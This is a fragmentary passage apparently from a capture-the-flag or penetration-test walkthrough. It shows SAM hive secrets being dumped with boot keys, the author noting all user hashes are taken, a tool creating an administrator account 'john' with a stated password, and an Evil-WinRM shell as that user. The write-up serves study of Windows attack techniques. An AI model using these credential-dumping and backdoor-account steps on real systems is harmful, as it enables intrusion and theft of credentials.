...
Boot Key: 7c7cfe4ff1d4639aaa93ddd2be306cc0
============== SAM hive secrets ==============
HBoot Key: 22a4dbbc6e9bb077f9633b22710a5c1a10101010101010101010101010101010
...
```
Now i have dumped all the hashes of all the users
...
But in this case ill leave that command blank so by default it should make a user `john:H4x00r123..` which is part of the administrators group
...
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john.HSM\Documents> whoami /priv
